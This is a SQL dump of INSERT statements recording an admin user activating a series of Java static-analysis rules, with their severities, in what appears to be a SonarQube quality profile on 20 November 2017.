INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3700, '2017-11-20 12:53:49.112', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfeu4bbGRdfPp-rXY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3701, '2017-11-20 12:53:49.196', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfewMbbGRdfPp-rXZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3702, '2017-11-20 12:53:49.248', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfexAbbGRdfPp-rXa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3703, '2017-11-20 12:53:49.323', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeyLbbGRdfPp-rXb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3704, '2017-11-20 12:53:49.383', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfezHbbGRdfPp-rXc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3705, '2017-11-20 12:53:49.403', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfezbbbGRdfPp-rXd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3706, '2017-11-20 12:53:49.42', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfezsbbGRdfPp-rXe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3707, '2017-11-20 12:53:49.437', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfez9bbGRdfPp-rXf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3708, '2017-11-20 12:53:49.461', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe0VbbGRdfPp-rXg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3709, '2017-11-20 12:53:49.488', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe0wbbGRdfPp-rXh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3710, '2017-11-20 12:53:49.512', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe1IbbGRdfPp-rXi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3711, '2017-11-20 12:53:49.538', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe1ibbGRdfPp-rXj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3712, '2017-11-20 12:53:49.564', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe18bbGRdfPp-rXk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3713, '2017-11-20 12:53:49.602', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe2ibbGRdfPp-rXl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3714, '2017-11-20 12:53:49.633', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe3BbbGRdfPp-rXm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3715, '2017-11-20 12:53:49.659', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe3bbbGRdfPp-rXn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3716, '2017-11-20 12:53:49.677', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe3tbbGRdfPp-rXo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3717, '2017-11-20 12:53:49.701', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe4FbbGRdfPp-rXp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3718, '2017-11-20 12:53:49.727', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe4fbbGRdfPp-rXq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3719, '2017-11-20 12:53:49.746', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe4ybbGRdfPp-rXr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3720, '2017-11-20 12:53:49.772', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe5MbbGRdfPp-rXs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3721, '2017-11-20 12:53:49.789', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe5dbbGRdfPp-rXt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3722, '2017-11-20 12:53:49.808', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe5wbbGRdfPp-rXu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3723, '2017-11-20 12:53:49.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe6KbbGRdfPp-rXv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3724, '2017-11-20 12:53:49.86', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe6kbbGRdfPp-rXw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3725, '2017-11-20 12:53:49.878', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe62bbGRdfPp-rXx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3726, '2017-11-20 12:53:49.903', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe7PbbGRdfPp-rXy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3727, '2017-11-20 12:53:49.922', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe7ibbGRdfPp-rXz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3728, '2017-11-20 12:53:49.945', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe75bbGRdfPp-rX0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3729, '2017-11-20 12:53:49.98', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe8cbbGRdfPp-rX1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3730, '2017-11-20 12:53:50.019', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe9DbbGRdfPp-rX2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3731, '2017-11-20 12:53:50.085', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe-FbbGRdfPp-rX3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3732, '2017-11-20 12:53:50.175', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfe_fbbGRdfPp-rX4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3733, '2017-11-20 12:53:50.217', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffAJbbGRdfPp-rX5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3734, '2017-11-20 12:53:50.267', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffA7bbGRdfPp-rX6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3735, '2017-11-20 12:53:50.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffB3bbGRdfPp-rX7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3736, '2017-11-20 12:53:50.345', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffCJbbGRdfPp-rX8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3737, '2017-11-20 12:53:50.368', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffCgbbGRdfPp-rX9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3738, '2017-11-20 12:53:50.386', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffCybbGRdfPp-rX-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3739, '2017-11-20 12:53:50.402', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffDCbbGRdfPp-rX_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3740, '2017-11-20 12:53:50.425', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffDZbbGRdfPp-rYA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3741, '2017-11-20 12:53:50.45', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffDybbGRdfPp-rYB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3742, '2017-11-20 12:53:50.467', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffEDbbGRdfPp-rYC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3743, '2017-11-20 12:53:50.492', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffEbbbGRdfPp-rYD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3744, '2017-11-20 12:53:50.517', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffE1bbGRdfPp-rYE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3745, '2017-11-20 12:53:50.542', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffFObbGRdfPp-rYF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3746, '2017-11-20 12:53:50.558', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffFebbGRdfPp-rYG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3747, '2017-11-20 12:53:50.596', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffGEbbGRdfPp-rYH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3748, '2017-11-20 12:53:50.627', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffGjbbGRdfPp-rYI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3749, '2017-11-20 12:53:50.655', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffG_bbGRdfPp-rYJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3750, '2017-11-20 12:53:50.68', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffHYbbGRdfPp-rYK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3751, '2017-11-20 12:53:50.705', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffHxbbGRdfPp-rYL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3752, '2017-11-20 12:53:50.731', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffILbbGRdfPp-rYM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3753, '2017-11-20 12:53:50.758', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffImbbGRdfPp-rYN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3754, '2017-11-20 12:53:50.785', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffJBbbGRdfPp-rYO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3755, '2017-11-20 12:53:50.818', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffJibbGRdfPp-rYP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3756, '2017-11-20 12:53:50.844', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffJ8bbGRdfPp-rYQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3757, '2017-11-20 12:53:50.87', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffKWbbGRdfPp-rYR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3758, '2017-11-20 12:53:50.908', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffK8bbGRdfPp-rYS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3759, '2017-11-20 12:53:50.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffLgbbGRdfPp-rYT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3760, '2017-11-20 12:53:50.983', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffMHbbGRdfPp-rYU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3761, '2017-11-20 12:53:51.027', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffMzbbGRdfPp-rYV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3762, '2017-11-20 12:53:51.061', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZffNVbbGRdfPp-rYW');
